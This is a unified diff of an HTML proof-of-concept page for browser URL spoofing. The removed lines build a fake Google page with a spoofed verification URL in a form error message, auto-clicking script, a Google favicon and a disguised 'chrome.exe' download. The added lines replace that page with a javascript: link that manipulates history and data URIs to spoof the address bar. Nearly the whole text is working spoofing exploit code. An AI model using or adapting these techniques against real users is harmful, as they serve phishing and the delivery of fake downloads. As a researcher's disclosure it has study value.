@@ -1,37 +1,8 @@
 <html>
 <head>
-<title>
-Google
-</title>
-<style>
-#qaz{
-position:absolute;
-border:1px solid red;
-top:-74px;
-left:95px;
-}
-
-#q{
-position:absolute;top:-100px;
-}
-</style>
+<title>URL SPOOF POC - @qab</title>
 </head>
 <body>
-<form>
-    <input id="qaz" type="text" required x-moz-errormessage="http://www.google.com/verify/login?c=SnVzdC" />
-    <input id="q" type="submit" value="Submit" />
-</form>
-<a href="data:application/octet-stream,badVIRUS" download="chrome.exe">Click here to download</a>
-<script>
-setInterval('q.click()',1);
-(function() {//This is to set the favicon
-    var q = document.createElement('link');
-    q.type = 'image/x-icon';
-    q.rel = 'shortcut icon';
-    q.href = 'http://www.google.com/favicon.ico';
-    document.getElementsByTagName('head')[0].appendChild(q);
-}());
-
-</script>
+<a href="javascript:try{if(history.length==0){'<script>location.reload()<\/script>'}else{q}}catch(e){if(history.length>1){document.write('<b>@qab</b>')}else{location='data:text/html,<script>history.back()</script>';}}" onclick="alert('please use the middle mouse button'); return false">Use the middle button mouse click here to open in new tab then navigate back</a>
 </body>
 </html>
